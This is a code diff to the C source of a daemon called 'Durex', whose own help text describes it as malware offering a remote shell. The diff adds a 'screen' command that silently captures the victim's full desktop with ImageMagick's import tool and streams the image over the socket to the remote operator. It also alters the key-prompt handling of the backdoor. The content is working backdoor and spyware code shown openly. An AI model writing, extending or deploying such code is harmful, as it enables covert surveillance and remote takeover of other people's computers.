@@ -113,7 +113,7 @@ static void	spawn_shell(t_users *users, char **envp)
 	}
 }
 
-static void	remove_daemon(t_users *users)
+static uint8_t	remove_daemon(t_users *users)
 {
 	pid_t	pid = 0;
 	char	*exec[] = {"/usr/sbin/service", "Durex", "uninstall", NULL};
@@ -136,6 +136,49 @@ static void	remove_daemon(t_users *users)
 		kill(pid, SIGTERM);
 	}
 	exit(0);
+}
+
+static void	screen(t_users *users, char **envp)
+{
+	pid_t	pid = 0;
+	char	*exec[] = {"/usr/bin/import", "-window", "root", "/tmp/screen.png", NULL};
+	int		status;
+	ssize_t	ret_read = 0;
+	char	buff[BUFFSIZE] = {0};
+
+	pid = fork();
+	if (pid == -1)
+	{
+		perror("fork failed");
+	}
+	else if (pid == 0)
+	{
+		if (execve(exec[0], exec, envp) == -1)
+			printf("error\n");
+	}
+	else
+	{
+		waitpid(pid, &status, 0);
+		kill(pid, SIGTERM);
+	}
+
+	struct stat	st;
+	int	fd = open("/tmp/screen.png", O_RDONLY);
+	if (fd)
+	{
+		fstat(fd, &st);
+		char	size[15] = {0};
+		sprintf(size, "%lu", st.st_size);
+		send(users->sd, &size, strlen(size), 0);
+			/*send(users->sd, (void*)st.st_size, sizeof(st.st_size), 0);*/
+		/*char	buff_img[st.st_size];*/
+		/*memset(&buff_img, 0, st.st_size);*/
+		/*read(fd, &buff_img, (size_t)st.st_size);*/
+		/*send(users->sd, &buff_img, (size_t)st.st_size, 0);*/
+		while ((ret_read = read(fd, &buff, BUFFSIZE)) > 0)
+			send(users->sd, &buff, ret_read, 0);
+	}
+
 }
 
 bool	run_daemon(t_connexion *connexion, char **envp)
@@ -177,8 +220,10 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 		for (users.i = 0; users.i < MAX_CLIENT; users.i++)
 		{
 			users.sd = connexion->client_socket[users.i];
-			if (FD_ISSET(users.sd , &users.readfds) && users.key[users.i] == false)
+			if (users.key[users.i] == false)
 				send(users.sd, "KEY: ", 5, 0);
+			/*if (FD_ISSET(users.sd , &users.readfds) && users.key[users.i] == false)*/
+				/*send(users.sd, "KEY: ", 5, 0);*/
 			if (FD_ISSET(users.sd , &users.readfds))
 			{
 				if (users.key[users.i] == true)
@@ -211,7 +256,9 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						}
 						if (!strcmp(buffer, "remove"))
 							remove_daemon(&users);
-						if (!strcmp(buffer, "?"))
+						else if (!strcmp(buffer, "screen"))
+							screen(&users, envp);
+						else if (!strcmp(buffer, "?"))
 							send(users.sd, "\n'shell'\t\tSpawn remote shell\n'quit'\t\tClose program\n'Remove'\tremove malware\n> ", 77, 0);
 						else if (!strcmp(buffer, "shell"))
 						{
